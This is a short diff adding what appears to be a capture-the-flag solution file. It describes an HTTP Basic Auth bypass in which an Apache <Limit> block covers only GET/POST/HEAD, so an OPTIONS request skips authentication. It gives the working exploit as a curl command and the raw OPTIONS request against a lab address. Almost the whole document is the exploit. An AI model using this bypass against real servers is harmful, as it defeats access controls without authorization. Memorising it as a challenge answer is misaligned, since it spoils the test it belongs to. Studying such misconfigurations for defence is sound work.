@@ -1,0 +1,4 @@
+# HTTP Basic Auth bypass via OPTIONS method. Apache <Limit> block only restricts GET/POST/HEAD. OPTIONS bypasses auth entirely and returns the flag. Exploit: curl -s -X OPTIONS http://172.17.0.1:49387/index.php
+
+OPTIONS /index.php HTTP/1.1
+Host: 172.17.0.1:49387
